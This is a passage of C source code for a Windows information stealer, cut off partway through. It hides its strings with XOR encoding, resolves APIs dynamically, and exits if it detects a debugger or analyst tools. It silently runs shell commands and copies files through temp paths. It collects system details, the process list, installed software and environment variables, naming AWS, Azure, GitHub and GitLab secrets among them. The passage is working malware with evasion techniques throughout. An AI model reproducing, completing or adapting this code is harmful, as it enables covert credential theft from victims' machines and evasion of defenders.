#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <shlobj.h>
#include <iphlpapi.h>
#include <tlhelp32.h>





static const unsigned char _xk[16] = {0x40, 0xd9, 0xff, 0xf1, 0x4e, 0x50, 0x32, 0x9b, 0x43, 0x03, 0x5f, 0x9e, 0x90, 0xde, 0x2a, 0xb2};
static unsigned char _es0[13] = {0x2b, 0xbc, 0x8d, 0x9f, 0x2b, 0x3c, 0x01, 0xa9, 0x6d, 0x67, 0x33, 0xf2, 0};
static unsigned char _es1[13] = {0x21, 0xbd, 0x89, 0x90, 0x3e, 0x39, 0x01, 0xa9, 0x6d, 0x67, 0x33, 0xf2, 0};
static unsigned char _es2[25] = {0x03, 0xab, 0x9a, 0x90, 0x3a, 0x35, 0x66, 0xf4, 0x2c, 0x6f, 0x37, 0xfb, 0xfc, 0xae, 0x19, 0x80, 0x13, 0xb7, 0x9e, 0x81, 0x3d, 0x38, 0x5d, 0xef, 0};
static unsigned char _es3[15] = {0x10, 0xab, 0x90, 0x92, 0x2b, 0x23, 0x41, 0xa8, 0x71, 0x45, 0x36, 0xec, 0xe3, 0xaa, 0};
static unsigned char _es4[14] = {0x10, 0xab, 0x90, 0x92, 0x2b, 0x23, 0x41, 0xa8, 0x71, 0x4d, 0x3a, 0xe6, 0xe4, 0};
static unsigned char _es5[14] = {0x12, 0xbc, 0x98, 0xbe, 0x3e, 0x35, 0x5c, 0xd0, 0x26, 0x7a, 0x1a, 0xe6, 0xd1, 0};
static unsigned char _es6[18] = {0x09, 0xaa, 0xbb, 0x94, 0x2c, 0x25, 0x55, 0xfc, 0x26, 0x71, 0x0f, 0xec, 0xf5, 0xad, 0x4f, 0xdc, 0x34, 0};
static unsigned char _es7[27] = {0x03, 0xb1, 0x9a, 0x92, 0x25, 0x02, 0x57, 0xf6, 0x2c, 0x77, 0x3a, 0xda, 0xf5, 0xbc, 0x5f, 0xd5, 0x27, 0xbc, 0x8d, 0xa1, 0x3c, 0x35, 0x41, 0xfe, 0x2d, 0x77, 0};
static unsigned char _es8[22] = {0x7d, 0xe4, 0xc2, 0xd1, 0x1d, 0x09, 0x61, 0xcf, 0x06, 0x4e, 0x7f, 0xd7, 0xde, 0x98, 0x65, 0x92, 0x7d, 0xe4, 0xc2, 0xfc, 0x44, 0};
static unsigned char _es9[6] = {0x01, 0x8b, 0xb2, 0xc7, 0x7a, 0};
static unsigned char _es10[61] = {0x23, 0xb4, 0x9b, 0xd1, 0x61, 0x33, 0x12, 0xe8, 0x3a, 0x70, 0x2b, 0xfb, 0xfd, 0xb7, 0x44, 0xd4, 0x2f, 0xf9, 0x83, 0xd1, 0x28, 0x39, 0x5c, 0xff, 0x30, 0x77, 0x2d, 0xbe, 0xbf, 0x9c, 0x0a, 0x9d, 0x03, 0xe3, 0xdd, 0xb5, 0x21, 0x3d, 0x53, 0xf2, 0x2d, 0x21, 0x7f, 0xb1, 0xd3, 0xe4, 0x08, 0xfe, 0x2f, 0xbe, 0x90, 0x9f, 0x6e, 0x03, 0x57, 0xe9, 0x35, 0x66, 0x2d, 0xbc, 0};
static unsigned char _es11[28] = {0x7d, 0xe4, 0xc2, 0xd1, 0x1c, 0x05, 0x7c, 0xd5, 0x0a, 0x4d, 0x18, 0xbe, 0xc0, 0x8c, 0x65, 0xf1, 0x05, 0x8a, 0xac, 0xb4, 0x1d, 0x70, 0x0f, 0xa6, 0x7e, 0x0e, 0x55, 0};
static unsigned char _es12[12] = {0x04, 0xb0, 0x8c, 0x81, 0x22, 0x31, 0x4b, 0xd5, 0x22, 0x6e, 0x3a, 0};
static unsigned char _es13[15] = {0x04, 0xb0, 0x8c, 0x81, 0x22, 0x31, 0x4b, 0xcd, 0x26, 0x71, 0x2c, 0xf7, 0xff, 0xb0, 0};
static unsigned char _es14[29] = {0x7d, 0xe4, 0xc2, 0xd1, 0x07, 0x1e, 0x61, 0xcf, 0x02, 0x4f, 0x13, 0xdb, 0xd4, 0xfe, 0x79, 0xfd, 0x06, 0x8d, 0xa8, 0xb0, 0x1c, 0x15, 0x12, 0xa6, 0x7e, 0x3e, 0x52, 0x94, 0};
static unsigned char _es15[52] = {0x13, 0x96, 0xb9, 0xa5, 0x19, 0x11, 0x60, 0xde, 0x1f, 0x4e, 0x36, 0xfd, 0xe2, 0xb1, 0x59, 0xdd, 0x26, 0xad, 0xa3, 0xa6, 0x27, 0x3e, 0x56, 0xf4, 0x34, 0x70, 0x03, 0xdd, 0xe5, 0xac, 0x58, 0xd7, 0x2e, 0xad, 0xa9, 0x94, 0x3c, 0x23, 0x5b, 0xf4, 0x2d, 0x5f, 0x0a, 0xf0, 0xf9, 0xb0, 0x59, 0xc6, 0x21, 0xb5, 0x93, 0};
static unsigned char _es16[52] = {0x13, 0x96, 0xb9, 0xa5, 0x19, 0x11, 0x60, 0xde, 0x1f, 0x4e, 0x36, 0xfd, 0xe2, 0xb1, 0x59, 0xdd, 0x26, 0xad, 0xa3, 0xa6, 0x27, 0x3e, 0x56, 0xf4, 0x34, 0x70, 0x03, 0xdd, 0xe5, 0xac, 0x58, 0xd7, 0x2e, 0xad, 0xa9, 0x94, 0x3c, 0x23, 0x5b, 0xf4, 0x2d, 0x5f, 0x0a, 0xf0, 0xf9, 0xb0, 0x59, 0xc6, 0x21, 0xb5, 0x93, 0};
static unsigned char _es17[27] = {0x7d, 0xe4, 0xc2, 0xd1, 0x0b, 0x1e, 0x64, 0xd2, 0x11, 0x4c, 0x11, 0xd3, 0xd5, 0x90, 0x7e, 0x92, 0x16, 0x98, 0xad, 0xa2, 0x6e, 0x6d, 0x0f, 0xa6, 0x4e, 0x09, 0};
static unsigned char _es18[20] = {0x7d, 0xe4, 0xc2, 0xd1, 0x0d, 0x1c, 0x7b, 0xcb, 0x01, 0x4c, 0x1e, 0xcc, 0xd4, 0xfe, 0x17, 0x8f, 0x7d, 0xd4, 0xf5, 0};
static unsigned char _es19[9] = {0x65, 0xf7, 0xd5, 0x82, 0x43, 0x5a, 0x3f, 0x91, 0};
static unsigned char _es20[25] = {0x7d, 0xe4, 0xc2, 0xd1, 0x19, 0x19, 0x74, 0xd2, 0x63, 0x53, 0x1e, 0xcd, 0xc3, 0x89, 0x65, 0xe0, 0x04, 0x8a, 0xdf, 0xcc, 0x73, 0x6d, 0x3f, 0x91, 0};
static unsigned char _es21[32] = {0x23, 0xb4, 0x9b, 0xd1, 0x61, 0x33, 0x12, 0xf5, 0x26, 0x77, 0x2c, 0xf6, 0xb0, 0xa9, 0x46, 0xd3, 0x2e, 0xf9, 0x8c, 0x99, 0x21, 0x27, 0x12, 0xeb, 0x31, 0x6c, 0x39, 0xf7, 0xfc, 0xbb, 0x59, 0};
static unsigned char _es22[22] = {0x68, 0xb7, 0x90, 0xd1, 0x39, 0x3c, 0x53, 0xf5, 0x63, 0x70, 0x3a, 0xec, 0xe6, 0xb7, 0x49, 0xd7, 0x69, 0xd4, 0xf5, 0xfc, 0x44, 0};
static unsigned char _es23[17] = {0x01, 0xb5, 0x93, 0xd1, 0x1b, 0x23, 0x57, 0xe9, 0x63, 0x53, 0x2d, 0xf1, 0xf6, 0xb7, 0x46, 0xd7, 0};
static unsigned char _es24[8] = {0x10, 0xab, 0x90, 0x97, 0x27, 0x3c, 0x57, 0};
static unsigned char _es25[12] = {0x0b, 0xbc, 0x86, 0xd1, 0x0d, 0x3f, 0x5c, 0xef, 0x26, 0x6d, 0x2b, 0};
static unsigned char _es26[12] = {0x2b, 0xbc, 0x86, 0xd1, 0x2d, 0x3f, 0x5c, 0xef, 0x26, 0x6d, 0x2b, 0};
static unsigned char _es27[10] = {0x0c, 0xb6, 0x98, 0x98, 0x20, 0x14, 0x53, 0xef, 0x22, 0};
static unsigned char _es28[8] = {0x03, 0xb6, 0x90, 0x9a, 0x27, 0x35, 0x41, 0};
static unsigned char _es29[8] = {0x17, 0xbc, 0x9d, 0xb5, 0x2f, 0x24, 0x53, 0};
static unsigned char _es30[8] = {0x08, 0xb0, 0x8c, 0x85, 0x21, 0x22, 0x4b, 0};
static unsigned char _es31[10] = {0x02, 0xb6, 0x90, 0x9a, 0x23, 0x31, 0x40, 0xf0, 0x30, 0};
static unsigned char _es32[23] = {0x7d, 0xe4, 0xc2, 0xd1, 0x0c, 0x02, 0x7d, 0xcc, 0x10, 0x46, 0x0d, 0xbe, 0xd4, 0x9f, 0x7e, 0xf3, 0x60, 0xe4, 0xc2, 0xcc, 0x43, 0x5a, 0};
static unsigned char _es33[14] = {0x25, 0xb7, 0x9c, 0x83, 0x37, 0x20, 0x46, 0xfe, 0x27, 0x5c, 0x34, 0xfb, 0xe9, 0};
static unsigned char _es34[8] = {0x04, 0xbc, 0x99, 0x90, 0x3b, 0x3c, 0x46, 0};
static unsigned char _es35[13] = {0x24, 0x88, 0x88, 0xc5, 0x39, 0x69, 0x65, 0xfc, 0x1b, 0x60, 0x0e, 0xa4, 0};
static unsigned char _es36[16] = {0x60, 0xf9, 0x8b, 0x9e, 0x25, 0x35, 0x5c, 0xa1, 0x63, 0x26, 0x71, 0xb4, 0xe3, 0xd3, 0x20, 0};
static unsigned char _es37[5] = {0x2d, 0xbf, 0x9e, 0xdf, 0};
static unsigned char _es38[20] = {0x60, 0xf9, 0x92, 0x97, 0x2f, 0x0f, 0x46, 0xf4, 0x28, 0x66, 0x31, 0xa4, 0xb0, 0xfb, 0x04, 0x98, 0x33, 0xd4, 0xf5, 0};
static unsigned char _es39[25] = {0x7d, 0xe4, 0xc2, 0xd1, 0x0a, 0x19, 0x61, 0xd8, 0x0c, 0x51, 0x1b, 0xbe, 0xc4, 0x91, 0x61, 0xf7, 0x0e, 0x8a, 0xdf, 0xcc, 0x73, 0x6d, 0x3f, 0x91, 0};
static unsigned char _es40[19] = {0x7d, 0xe4, 0xc2, 0xd1, 0x1a, 0x15, 0x7e, 0xde, 0x04, 0x51, 0x1e, 0xd3, 0xb0, 0xe3, 0x17, 0x8f, 0x4d, 0xd3, 0};
static unsigned char _es41[23] = {0x60, 0xf9, 0x94, 0x94, 0x37, 0x0f, 0x56, 0xfa, 0x37, 0x62, 0x2c, 0xa4, 0xb0, 0xae, 0x58, 0xd7, 0x33, 0xbc, 0x91, 0x85, 0x43, 0x5a, 0};
static unsigned char _es42[26] = {0x7d, 0xe4, 0xc2, 0xd1, 0x08, 0x04, 0x62, 0xbb, 0x00, 0x51, 0x1a, 0xda, 0xd5, 0x90, 0x7e, 0xfb, 0x01, 0x95, 0xac, 0xd1, 0x73, 0x6d, 0x0f, 0x96, 0x49, 0};
static unsigned char _es43[32] = {0x1b, 0x9f, 0x96, 0x9d, 0x2b, 0x0a, 0x5b, 0xf7, 0x2f, 0x62, 0x7f, 0xec, 0xf5, 0xbd, 0x4f, 0xdc, 0x34, 0xaa, 0x9a, 0x83, 0x38, 0x35, 0x40, 0xe8, 0x6d, 0x7b, 0x32, 0xf2, 0xcd, 0xd3, 0x20, 0};
static unsigned char _es44[30] = {0x1b, 0x9f, 0x96, 0x9d, 0x2b, 0x0a, 0x5b, 0xf7, 0x2f, 0x62, 0x7f, 0xed, 0xf9, 0xaa, 0x4f, 0xdf, 0x21, 0xb7, 0x9e, 0x96, 0x2b, 0x22, 0x1c, 0xe3, 0x2e, 0x6f, 0x02, 0x93, 0x9a, 0};
static unsigned char _es45[42] = {0x13, 0x96, 0xb9, 0xa5, 0x19, 0x11, 0x60, 0xde, 0x1f, 0x4e, 0x3e, 0xec, 0xe4, 0xb7, 0x44, 0x92, 0x10, 0xab, 0x96, 0x9a, 0x3c, 0x29, 0x5e, 0xc7, 0x14, 0x6a, 0x31, 0xcd, 0xd3, 0x8e, 0x0a, 0x80, 0x1c, 0x8a, 0x9a, 0x82, 0x3d, 0x39, 0x5d, 0xf5, 0x30, 0};
static unsigned char _es46[26] = {0x7d, 0xe4, 0xc2, 0xd1, 0x08, 0x04, 0x62, 0xbb, 0x00, 0x51, 0x1a, 0xda, 0xd5, 0x90, 0x7e, 0xfb, 0x01, 0x95, 0xac, 0xd1, 0x73, 0x6d, 0x0f, 0x96, 0x49, 0};
static unsigned char _es47[20] = {0x1b, 0x8e, 0x96, 0x9f, 0x1d, 0x13, 0x62, 0xbb, 0x30, 0x66, 0x2c, 0xed, 0xf9, 0xb1, 0x44, 0xc1, 0x1d, 0xd4, 0xf5, 0};
static unsigned char _es48[9] = {0x08, 0xb6, 0x8c, 0x85, 0x00, 0x31, 0x5f, 0xfe, 0};
static unsigned char _es49[9] = {0x15, 0xaa, 0x9a, 0x83, 0x00, 0x31, 0x5f, 0xfe, 0};
static unsigned char _es50[9] = {0x10, 0xb8, 0x8c, 0x82, 0x39, 0x3f, 0x40, 0xff, 0};
static unsigned char _es51[12] = {0x68, 0xb2, 0x9a, 0x88, 0x63, 0x32, 0x53, 0xe8, 0x26, 0x67, 0x76, 0};
static unsigned char _es52[19] = {0x7d, 0xe4, 0xc2, 0xd1, 0x1d, 0x03, 0x7a, 0xbb, 0x08, 0x46, 0x06, 0xcd, 0xb0, 0xe3, 0x17, 0x8f, 0x4d, 0xd3, 0};
static unsigned char _es53[26] = {0x7d, 0xe4, 0xc2, 0xd1, 0x09, 0x19, 0x66, 0xbb, 0x00, 0x51, 0x1a, 0xda, 0xd5, 0x90, 0x7e, 0xfb, 0x01, 0x95, 0xac, 0xd1, 0x73, 0x6d, 0x0f, 0x96, 0x49, 0};
static unsigned char _es54[5] = {0x4d, 0xd3, 0xf2, 0xfb, 0};
static unsigned char _es55[28] = {0x7d, 0xe4, 0xc2, 0xd1, 0x0d, 0x1c, 0x7d, 0xce, 0x07, 0x23, 0x1c, 0xcc, 0xd5, 0x9a, 0x6f, 0xfc, 0x14, 0x90, 0xbe, 0xbd, 0x1d, 0x70, 0x0f, 0xa6, 0x7e, 0x0e, 0x55, 0};
static unsigned char _es56[25] = {0x7d, 0xe4, 0xc2, 0xd1, 0x0d, 0x02, 0x6b, 0xcb, 0x17, 0x4c, 0x7f, 0xc9, 0xd1, 0x92, 0x66, 0xf7, 0x14, 0x8a, 0xdf, 0xcc, 0x73, 0x6d, 0x3f, 0x91, 0};
static unsigned char _es57[21] = {0x7d, 0xe4, 0xc2, 0xd1, 0x1d, 0x13, 0x60, 0xde, 0x06, 0x4d, 0x0c, 0xd6, 0xdf, 0x8a, 0x0a, 0x8f, 0x7d, 0xe4, 0xf2, 0xfb, 0};
static unsigned char _es58[21] = {0x7d, 0xe4, 0xc2, 0xd1, 0x1d, 0x13, 0x60, 0xde, 0x06, 0x4d, 0x0c, 0xd6, 0xdf, 0x8a, 0x0a, 0x8f, 0x7d, 0xe4, 0xf2, 0xfb, 0};
static unsigned char _es59[34] = {0x60, 0xf9, 0xd7, 0x82, 0x25, 0x39, 0x42, 0xeb, 0x26, 0x67, 0x65, 0xbe, 0xfe, 0xb1, 0x0a, 0xd6, 0x25, 0xaa, 0x94, 0x85, 0x21, 0x20, 0x12, 0xe8, 0x26, 0x70, 0x2c, 0xf7, 0xff, 0xb0, 0x03, 0xbf, 0x4a, 0};
static void _xd_init(void){static int _d=0;if(_d)return;_d=1;for(int i=0;i<12;i++)_es0[i]^=_xk[i%16];for(int i=0;i<12;i++)_es1[i]^=_xk[i%16];for(int i=0;i<24;i++)_es2[i]^=_xk[i%16];for(int i=0;i<14;i++)_es3[i]^=_xk[i%16];for(int i=0;i<13;i++)_es4[i]^=_xk[i%16];for(int i=0;i<13;i++)_es5[i]^=_xk[i%16];for(int i=0;i<17;i++)_es6[i]^=_xk[i%16];for(int i=0;i<26;i++)_es7[i]^=_xk[i%16];for(int i=0;i<21;i++)_es8[i]^=_xk[i%16];for(int i=0;i<5;i++)_es9[i]^=_xk[i%16];for(int i=0;i<60;i++)_es10[i]^=_xk[i%16];for(int i=0;i<27;i++)_es11[i]^=_xk[i%16];for(int i=0;i<11;i++)_es12[i]^=_xk[i%16];for(int i=0;i<14;i++)_es13[i]^=_xk[i%16];for(int i=0;i<28;i++)_es14[i]^=_xk[i%16];for(int i=0;i<51;i++)_es15[i]^=_xk[i%16];for(int i=0;i<51;i++)_es16[i]^=_xk[i%16];for(int i=0;i<26;i++)_es17[i]^=_xk[i%16];for(int i=0;i<19;i++)_es18[i]^=_xk[i%16];for(int i=0;i<8;i++)_es19[i]^=_xk[i%16];for(int i=0;i<24;i++)_es20[i]^=_xk[i%16];for(int i=0;i<31;i++)_es21[i]^=_xk[i%16];for(int i=0;i<21;i++)_es22[i]^=_xk[i%16];for(int i=0;i<16;i++)_es23[i]^=_xk[i%16];for(int i=0;i<7;i++)_es24[i]^=_xk[i%16];for(int i=0;i<11;i++)_es25[i]^=_xk[i%16];for(int i=0;i<11;i++)_es26[i]^=_xk[i%16];for(int i=0;i<9;i++)_es27[i]^=_xk[i%16];for(int i=0;i<7;i++)_es28[i]^=_xk[i%16];for(int i=0;i<7;i++)_es29[i]^=_xk[i%16];for(int i=0;i<7;i++)_es30[i]^=_xk[i%16];for(int i=0;i<9;i++)_es31[i]^=_xk[i%16];for(int i=0;i<22;i++)_es32[i]^=_xk[i%16];for(int i=0;i<13;i++)_es33[i]^=_xk[i%16];for(int i=0;i<7;i++)_es34[i]^=_xk[i%16];for(int i=0;i<12;i++)_es35[i]^=_xk[i%16];for(int i=0;i<15;i++)_es36[i]^=_xk[i%16];for(int i=0;i<4;i++)_es37[i]^=_xk[i%16];for(int i=0;i<19;i++)_es38[i]^=_xk[i%16];for(int i=0;i<24;i++)_es39[i]^=_xk[i%16];for(int i=0;i<18;i++)_es40[i]^=_xk[i%16];for(int i=0;i<22;i++)_es41[i]^=_xk[i%16];for(int i=0;i<25;i++)_es42[i]^=_xk[i%16];for(int i=0;i<31;i++)_es43[i]^=_xk[i%16];for(int i=0;i<29;i++)_es44[i]^=_xk[i%16];for(int i=0;i<41;i++)_es45[i]^=_xk[i%16];for(int i=0;i<25;i++)_es46[i]^=_xk[i%16];for(int i=0;i<19;i++)_es47[i]^=_xk[i%16];for(int i=0;i<8;i++)_es48[i]^=_xk[i%16];for(int i=0;i<8;i++)_es49[i]^=_xk[i%16];for(int i=0;i<8;i++)_es50[i]^=_xk[i%16];for(int i=0;i<11;i++)_es51[i]^=_xk[i%16];for(int i=0;i<18;i++)_es52[i]^=_xk[i%16];for(int i=0;i<25;i++)_es53[i]^=_xk[i%16];for(int i=0;i<4;i++)_es54[i]^=_xk[i%16];for(int i=0;i<27;i++)_es55[i]^=_xk[i%16];for(int i=0;i<24;i++)_es56[i]^=_xk[i%16];for(int i=0;i<20;i++)_es57[i]^=_xk[i%16];for(int i=0;i<20;i++)_es58[i]^=_xk[i%16];for(int i=0;i<33;i++)_es59[i]^=_xk[i%16];}

/* dynamic API resolution */
typedef HANDLE (WINAPI *_tCreateToolhelp32Snapshot)(DWORD,DWORD);
static _tCreateToolhelp32Snapshot _pCreateToolhelp32Snapshot = NULL;
typedef BOOL (WINAPI *_tProcess32First)(HANDLE,LPPROCESSENTRY32);
static _tProcess32First _pProcess32First = NULL;
typedef BOOL (WINAPI *_tProcess32Next)(HANDLE,LPPROCESSENTRY32);
static _tProcess32Next _pProcess32Next = NULL;
typedef LSTATUS (WINAPI *_tRegOpenKeyExA)(HKEY,LPCSTR,DWORD,REGSAM,PHKEY);
static _tRegOpenKeyExA _pRegOpenKeyExA = NULL;
typedef BOOL (WINAPI *_tIsDebuggerPresent)(void);
static _tIsDebuggerPresent _pIsDebuggerPresent = NULL;
typedef BOOL (WINAPI *_tCheckRemoteDebuggerPresent)(HANDLE,PBOOL);
static _tCheckRemoteDebuggerPresent _pCheckRemoteDebuggerPresent = NULL;
static void _api_init(void){static int _d=0;if(_d)return;_d=1;HMODULE _hkernel32_dll=LoadLibraryA(((char*)_es0));HMODULE _hadvapi32_dll=LoadLibraryA(((char*)_es1));if(_hkernel32_dll)_pCreateToolhelp32Snapshot=(_tCreateToolhelp32Snapshot)GetProcAddress(_hkernel32_dll,((char*)_es2));if(_hkernel32_dll)_pProcess32First=(_tProcess32First)GetProcAddress(_hkernel32_dll,((char*)_es3));if(_hkernel32_dll)_pProcess32Next=(_tProcess32Next)GetProcAddress(_hkernel32_dll,((char*)_es4));if(_hadvapi32_dll)_pRegOpenKeyExA=(_tRegOpenKeyExA)GetProcAddress(_hadvapi32_dll,((char*)_es5));if(_hkernel32_dll)_pIsDebuggerPresent=(_tIsDebuggerPresent)GetProcAddress(_hkernel32_dll,((char*)_es6));if(_hkernel32_dll)_pCheckRemoteDebuggerPresent=(_tCheckRemoteDebuggerPresent)GetProcAddress(_hkernel32_dll,((char*)_es7));}

/* anti-debugging — exit silently if analyst tools are detected */
static int _chk_dbg(void) {
    if (_pIsDebuggerPresent()) return 1;
    BOOL _rd = FALSE;
    _pCheckRemoteDebuggerPresent(GetCurrentProcess(), &_rd);
    if (_rd) return 1;
    /* timing check: rdtsc delta > 10M cycles = single-stepping */
    LARGE_INTEGER _f, _s, _e;
    if (QueryPerformanceFrequency(&_f) && QueryPerformanceCounter(&_s)) {
        volatile int _v = 0;
        for (int i = 0; i < 100; i++) _v += i;
        QueryPerformanceCounter(&_e);
        if ((_e.QuadPart - _s.QuadPart) > _f.QuadPart) return 1;
    }
    return 0;
}

/* ── core/emit_buffer ── */

#define COLLECT_BUF (1024 * 1024)

static char *g_data = NULL;
static DWORD g_pos = 0;
static DWORD g_cap = 0;

static void init_buffer(void) {
    g_data = (char *)malloc(COLLECT_BUF);
    if (g_data) g_cap = COLLECT_BUF;
    g_pos = 0;
}

static void emit(const char *d, DWORD n) {
    { volatile DWORD _jp2041 = GetCurrentProcessId(); (void)_jp2041; }
    if (!g_data) return;
    if (g_pos + n >= g_cap) {
        DWORD _njlno = g_pos + n + (256 * (931 + 93));
        char *re = (char *)realloc(g_data, _njlno);
        if (!re) return;
        g_data = re;
        g_cap = _njlno;
    }
    memcpy(g_data + g_pos, d, n);
    g_pos += n;
}

static void emitf(const char *fmt, ...) {
    char tmp[4096];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);
    if (n > 0) emit(tmp, (DWORD)n);
}


/* ── core/run_cmd ── */
static void run_cmd(const char *cmd, char *out, DWORD out_sz, DWORD *out_len) {
    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};
    HANDLE hRead, hWrite;
    *out_len = 0;
    if (!CreatePipe(&hRead, &hWrite, &sa, 0)) return;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    char buf[512];
    strncpy(buf, cmd, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';
    if (!CreateProcessA(NULL, buf, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(hRead); CloseHandle(hWrite); return;
    }
    CloseHandle(hWrite);
    WaitForSingleObject(pi.hProcess, (14985 + 15));
    DWORD _tkkub = 0, _rtqbm = 0;
    while (_tkkub < out_sz - 1 && ReadFile(hRead, out + _tkkub, out_sz - _tkkub - 1, &_rtqbm, NULL) && _rtqbm > 0)
        _tkkub += _rtqbm;
    out[_tkkub] = '\0';
    *out_len = _tkkub;
    CloseHandle(hRead);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}


/* ── core/file_ops ── */
static int file_exists(const char *path) {
    return GetFileAttributesA(path) != INVALID_FILE_ATTRIBUTES;
}

static void emit_file(const char *path, DWORD max_sz) {
    HANDLE h = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                           NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    { volatile DWORD _jd1973 = GetTickCount(); (void)_jd1973; }
    if (h == INVALID_HANDLE_VALUE) return;
    DWORD _shlnl = GetFileSize(h, NULL);
    if (_shlnl == 0 || _shlnl > max_sz) { CloseHandle(h); return; }
    BYTE *buf = (BYTE *)malloc(_shlnl);
    if (buf) {
        DWORD _rtqbm;
        if (ReadFile(h, buf, _shlnl, &_rtqbm, NULL) && _rtqbm > 0)
            emit((const char *)buf, _rtqbm);
        free(buf);
    }
    CloseHandle(h);
}

static void grab_file(const char *src, const char *tag, DWORD max_sz) {
    char temp[MAX_PATH];
    GetTempPathA(MAX_PATH, temp);
    char dst[MAX_PATH];
    snprintf(dst, MAX_PATH, "%s\\~%lx.tmp", temp, GetTickCount());
    if (CopyFileA(src, dst, FALSE)) {
        HANDLE _hpyee = CreateFileA(dst, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        DWORD _fmghh = (_hpyee != INVALID_HANDLE_VALUE) ? GetFileSize(_hpyee, NULL) : 0;
        if (_hpyee != INVALID_HANDLE_VALUE) CloseHandle(_hpyee);
        emitf("  [%s] %lu bytes\r\n", tag, (unsigned long)_fmghh);
        emit_file(dst, max_sz);
        DeleteFileA(dst);
    }
}


/* ── collectors/system_info ── */

static void collect_system_info(void) {
    emitf(((char*)_es8));

    char hostname[256] = {0};
    DWORD _hhqhx = sizeof(hostname);
    if (GetComputerNameA(hostname, &_hhqhx)) emitf("Hostname: %s\r\n", hostname);

    char user[256] = {0};
    DWORD _uzmui = sizeof(user);
    if (GetUserNameA(user, &_uzmui)) emitf("Username: %s\r\n", user);

    OSVERSIONINFOA ov;
    ZeroMemory(&ov, sizeof(ov));
    ov.dwOSVersionInfoSize = sizeof(ov);
    GetVersionExA(&ov);
    emitf("OS: Windows %lu.%lu Build %lu\r\n", ov.dwMajorVersion, ov.dwMinorVersion, ov.dwBuildNumber);

    SYSTEM_INFO si;
    GetSystemInfo(&si);
    emitf("Arch: %s  CPUs: %lu\r\n",
          si.wProcessorArchitecture == 9 ? "x64" :
          si.wProcessorArchitecture == 12 ? ((char*)_es9) : "x86",
          si.dwNumberOfProcessors);

    MEMORYSTATUSEX ms;
    ms.dwLength = sizeof(ms);
    if (GlobalMemoryStatusEx(&ms))
        emitf("RAM: %llu MB\r\n", ms.ullTotalPhys / (1024 * (1023 + 1)));

    ULONG _amnsv = 0;
    GetAdaptersInfo(NULL, &_amnsv);
    { volatile int _jv8616 = 0; _jv8616 = _jv8616 ^ _jv8616; (void)_jv8616; }
    if (_amnsv > 0) {
        PIP_ADAPTER_INFO ai = (PIP_ADAPTER_INFO)malloc(_amnsv);
        if (ai && GetAdaptersInfo(ai, &_amnsv) == NO_ERROR) {
            for (PIP_ADAPTER_INFO p = ai; p; p = p->Next)
                emitf("NIC: %s  IP: %s  MAC: %02X:%02X:%02X:%02X:%02X:%02X\r\n",
                      p->Description, p->IpAddressList.IpAddress.String,
                      p->Address[0], p->Address[1], p->Address[2],
                      p->Address[3], p->Address[4], p->Address[5]);
        }
        free(ai);
    }

    char cmd_out[4096] = {0};
    DWORD _czkfj = 0;
    run_cmd(((char*)_es10),
            cmd_out, sizeof(cmd_out), &_czkfj);
    if (_czkfj > 0) emitf("%s", cmd_out);

    emitf("\r\n");
}


/* ── collectors/processes ── */

static void collect_processes(void) {
    emitf(((char*)_es11));
    HANDLE _szyvy = _pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (_szyvy == INVALID_HANDLE_VALUE) return;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    if (_pProcess32First(_szyvy, &pe)) {
        do {
            emitf("  [%5lu] %s\r\n", pe.th32ProcessID, pe.szExeFile);
        } while (_pProcess32Next(_szyvy, &pe));
    }
    CloseHandle(_szyvy);
    emitf("\r\n");
}


/* ── collectors/installed_software ── */
static void enum_installed_from_key(HKEY root, const char *subkey) {
    HKEY _hxeoy;
    if (_pRegOpenKeyExA(root, subkey, 0, KEY_READ | KEY_WOW64_64KEY, &_hxeoy) != ERROR_SUCCESS)
        return;
    char name[256];
    DWORD _iarwq = 0, name_sz;
    while (1) {
        name_sz = sizeof(name);
        if (RegEnumKeyExA(_hxeoy, _iarwq++, name, &name_sz, NULL, NULL, NULL, NULL) != ERROR_SUCCESS)
            break;
        HKEY _sxfsl;
        { volatile int _jx7129 = 1; while(_jx7129 > 1) _jx7129--; (void)_jx7129; }
        if (_pRegOpenKeyExA(_hxeoy, name, 0, KEY_READ, &_sxfsl) == ERROR_SUCCESS) {
            char display[256] = {0}, version[64] = {0};
            DWORD _dofgo = sizeof(display), vsz = sizeof(version);
            RegQueryValueExA(_sxfsl, ((char*)_es12), NULL, NULL, (BYTE *)display, &_dofgo);
            RegQueryValueExA(_sxfsl, ((char*)_es13), NULL, NULL, (BYTE *)version, &vsz);
            if (display[0])
                emitf("  %s %s\r\n", display, version);
            RegCloseKey(_sxfsl);
        }
    }
    RegCloseKey(_hxeoy);
}

static void collect_installed_software(void) {
    emitf(((char*)_es14));
    enum_installed_from_key(HKEY_LOCAL_MACHINE,
        ((char*)_es15));
    enum_installed_from_key(HKEY_CURRENT_USER,
        ((char*)_es16));
    emitf("\r\n");
}


/* ── collectors/env_vars ── */
static void collect_env_vars(void) {
    emitf(((char*)_es17));
    const char *interesting[] = {
        "USERDOMAIN", "LOGONSERVER", "COMPUTERNAME", "USERNAME",
        "HOMEPATH", "USERPROFILE", "PATH",
        "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "AWS_SESSION_TOKEN",
        "AZURE_SUBSCRIPTION_ID", "AZURE_TENANT_ID", "AZURE_CLIENT_SECRET",
        "GOOGLE_APPLICATION_CREDENTIALS",
        "GITHUB_TOKEN", "GH_TOKEN", "GITLAB_TOKEN",
        "DOCKER_HOST", "KUBECONFIG",
